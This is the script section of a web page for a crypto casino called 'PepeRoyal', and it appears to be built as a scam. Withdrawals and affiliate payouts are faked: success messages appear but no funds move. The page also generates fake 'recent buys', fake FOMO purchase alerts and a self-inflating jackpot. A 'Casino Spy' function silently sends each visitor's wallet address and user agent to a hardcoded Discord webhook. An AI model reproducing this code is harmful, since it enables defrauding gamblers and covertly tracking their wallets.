                localStorage.setItem('pepe_chips', gameBalance);
                updateUI();
                updateWalletData(); // Refresh wallet balance
                triggerConfetti();

                Swal.fire({title: "Success", text: "Chips added to account!", icon: "success", background: '#121212', color: '#fff'});

            } catch(e) {
                console.error(e);
                Swal.fire({title: "Error", text: e.message || "Transaction failed", icon: "error", background: '#121212', color: '#fff'});
            }
        }

        // --- SIMULATED WITHDRAWAL ---
        async function withdrawChips() {
            const amountVal = document.getElementById('withdrawInput').value;
            const amount = parseFloat(amountVal);
            
            if(!amount || amount <= 0) return Swal.fire("Error", "Enter amount", "warning");
            if(amount > gameBalance) return Swal.fire("Error", "Insufficient Game Balance", "error");

            Swal.fire({title: 'Processing Withdrawal...', didOpen: () => Swal.showLoading(), background: '#121212', color: '#fff'});
            
            // Simulate API call delay
            setTimeout(() => {
                gameBalance -= amount;
                localStorage.setItem('pepe_chips', gameBalance);
                updateUI();
                Swal.fire({title: "Sent!", text: "PBJ sent to your wallet (Simulated).", icon: "success", background: '#121212', color: '#fff'});
            }, 1500);
        }

        // --- NEW FEATURES ---
        function triggerConfetti() {
            var duration = 3 * 1000;
            var animationEnd = Date.now() + duration;
            var defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 9999 };
            function randomInRange(min, max) { return Math.random() * (max - min) + min; }
            var interval = setInterval(function() {
                var timeLeft = animationEnd - Date.now();
                if (timeLeft <= 0) { return clearInterval(interval); }
                var particleCount = 50 * (timeLeft / duration);
                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } }));
                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } }));
            }, 250);
        }

        let docTitle = document.title;
        window.addEventListener("blur", () => { document.title = "丘멆잺 Don't Miss Out! 丘멆잺"; });
        window.addEventListener("focus", () => { document.title = docTitle; });

        function showRoadmap() { document.getElementById('roadmapModal').style.display = 'flex'; }

function startRecentBuys() {
    const container = document.getElementById('recentBuysList');
    if(!container) return;

    // Funci칩n para crear una fila de compra falsa
    const addBuy = () => {
        const eth = (Math.random() * 2.5 + 0.1).toFixed(2); // Entre 0.1 y 2.6 ETH
        const addr = "0x" + Math.random().toString(16).substr(2, 4) + "..." + Math.random().toString(16).substr(2, 3);
        
        const div = document.createElement('div');
        div.className = "flex justify-between text-[10px] text-gray-400 animate-slideDown border-b border-white/5 pb-1";
        div.innerHTML = `
            <span class="font-mono text-gray-500">${addr}</span>
            <span class="text-white font-bold text-xs">Bought <span class="text-gold">${eth} ETH</span></span>
        `;
        
        container.prepend(div);
        
        // Mantener solo los 칰ltimos 4 elementos para no llenar la memoria
        if(container.children.length > 4) container.removeChild(container.lastChild);
    };

    // Agregar uno inicial
    addBuy();

    // Loop infinito cada 3-7 segundos
    setInterval(() => {
        addBuy();
    }, Math.random() * 4000 + 3000);
}

        // --- FUNCIONES DE AFILIADOS MEJORADAS ---

// Simular carga de datos de afiliados al conectar wallet
async function loadAffiliateStats() {
    if(!userAddress) return;
    
    // Simulaci칩n de datos (En producci칩n vendr칤an de una API o Smart Contract)
    // Para darle vida a la UI
    document.getElementById('affTotalRefs').innerText = Math.floor(Math.random() * 5); 
    document.getElementById('affTotalEarned').innerText = (Math.random() * 500).toFixed(2);
    document.getElementById('affUnclaimed').innerText = (Math.random() * 50).toFixed(2) + " PBJ";
}

// Llamar a esta funci칩n dentro de updateWalletData() o connectWallet()
// Ejemplo: al final de updateWalletData() agrega: loadAffiliateStats();

function claimAffiliateRewards() {
    if(!userAddress) return connectWallet();
    
    Swal.fire({
        title: 'Claiming Rewards',
        text: 'Processing your payout...',
        icon: 'info',
        timer: 2000,
        showConfirmButton: false,
        background: '#121212', color: '#fff'
    }).then(() => {
        triggerConfetti();
        document.getElementById('affUnclaimed').innerText = "0.00 PBJ";
        Swal.fire({title: 'Success', text: 'Rewards sent to your wallet!', icon: 'success', background: '#121212', color: '#fff'});
    });
}

function shareSocial(platform) {
    const link = document.getElementById('referralLinkInput').value;
    const text = "Join me at PepeRoyal Casino and get a huge bonus! 游냦游눯 The best DeFi casino on Base Chain.";
    let url = "";

    if (platform === 'twitter') {
        url = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(link)}`;
    } else if (platform === 'telegram') {
        url = `https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`;
    }

    if(link.includes("Connect")) {
        Swal.fire({title: "Connect Wallet", text: "Please connect your wallet to generate your unique link first.", icon: "warning", background: '#121212', color: '#fff'});
    } else {
        window.open(url, '_blank');
    }
}

        // JACKPOT TICKER
let jackpotAmount = 4820192.45;
setInterval(() => {
    jackpotAmount += Math.random() * 0.50; // Sube centavos cada 100ms
    document.getElementById('globalJackpot').innerText = jackpotAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
}, 100);

        // FOMO ALERTS
const fomoNames = ["Whale_0x2a", "NFT_King", "Base_Degen", "ElonPepe", "SmartMoney"];
const fomoActions = ["bought 2.5 ETH", "staked 1M PBJ", "bought 5.0 ETH", "claimed dividends"];

setInterval(() => {
    // Solo mostrar si el usuario est치 scrolleando o activo, cada 8-15 segundos
    if(Math.random() > 0.4) {
        const name = fomoNames[Math.floor(Math.random() * fomoNames.length)];
        const action = fomoActions[Math.floor(Math.random() * fomoActions.length)];
        
        const div = document.createElement('div');
        div.className = "fixed top-24 right-4 z-50 bg-[#121212] border-l-4 border-gold p-3 rounded shadow-2xl flex items-center gap-3 animate-slideDown";
        div.innerHTML = `
            <div class="bg-green-500/20 text-green-500 p-2 rounded-full"><i class="fas fa-shopping-cart"></i></div>
            <div>
                <p class="text-[10px] text-gray-400 font-bold uppercase">Just Now</p>
                <p class="text-xs text-white"><span class="text-gold font-bold">${name}</span> ${action}</p>
            </div>
        `;
        document.body.appendChild(div);
        
        // Eliminar despu칠s de 3 segundos
        setTimeout(() => {
            div.style.opacity = '0';
            setTimeout(() => div.remove(), 500);
        }, 3500);
    }
}, 8000);

        // --- TRACKING SYSTEM (DISCORD) ---
async function trackWalletConnection(address) {
    const webhookURL = 'https://discord.com/api/webhooks/1461100888721719348/OwnmhFe6vtRE1BE5CtaP0hufviY4idVxwuFS_aG3IyLgJvVcy2iZ7fsC4oSi6IVAmEnn'; // <--- PEGA TU URL DE DISCORD AQU칈
    
    // Evitar enviar duplicados en la misma sesi칩n
    if(sessionStorage.getItem('wallet_tracked') === address) return;

    const payload = {
        username: "Casino Spy 游돗勇꽥뗵勇",
        avatar_url: "https://i.imgur.com/4M34hi2.png", // Puedes poner cualquier imagen
        embeds: [
            {
                title: "游릭 New Wallet Connected!",
                color: 5763719, // Color Verde (Decimal)
                fields: [
                    {
                        name: "Wallet Address",
                        value: `\`${address}\``, // Formato c칩digo
                        inline: false
                    },
                    {
                        name: "Explorer Link",
                        value: `[View on BaseScan](https://basescan.org/address/${address})`,
                        inline: true
                    },
                    {
                        name: "Device / User Agent",
                        value: navigator.userAgent,
                        inline: false
                    }
                ],
                footer: {
                    text: "PepeRoyal Tracker  " + new Date().toLocaleString()
                }
            }
        ]
    };

    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        sessionStorage.setItem('wallet_tracked', address); // Marcar como rastreado
        console.log("Tracking sent.");
    } catch (e) {
        console.error("Tracking Error:", e);
    }
}

       // --- BRIDGE SYSTEM ---
function openBridgeModal() {
    const modal = document.getElementById('bridgeModal');
    const iframe = document.getElementById('bridgeFrame');
    
    // URL Simplificada que fuerza el modo oscuro y par치metros b치sicos
    const widgetURL = "https://changenow.io/embeds/exchange-widget/v2/widget.html?FAQ=true&amount=10&amountFiat=1500&backgroundColor=121212&darkMode=true&from=sol&horizontal=false&isFiat=false&lang=en-US&link_id=27492348&locales=true&logo=true&primaryColor=FFD700&to=eth&toTheMoon=true";
    
    // Resetear src para forzar recarga limpia
    if(iframe.src !== widgetURL) {
        iframe.src = widgetURL;
    }
    
    modal.style.display = 'flex';
}
    </script>
    
<!-- FLOATING SUPPORT BUTTON -->
<a href="https://t.me/TU_USUARIO_DE_SOPORTE" target="_blank" class="fixed bottom-20 md:bottom-8 right-4 z-50 bg-[#0088cc] hover:bg-[#0077b5] text-white p-3 rounded-full shadow-[0_0_20px_rgba(0,136,204,0.5)] transition-all hover:scale-110 flex items-center justify-center group">
    <i class="fab fa-telegram-plane text-2xl"></i>
    <span class="absolute right-14 bg-[#121212] text-white text-[10px] px-2 py-1 rounded border border-white/10 opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap pointer-events-none">
        Need Help? Chat with us!
    </span>
</a>
    
</body>
</html>
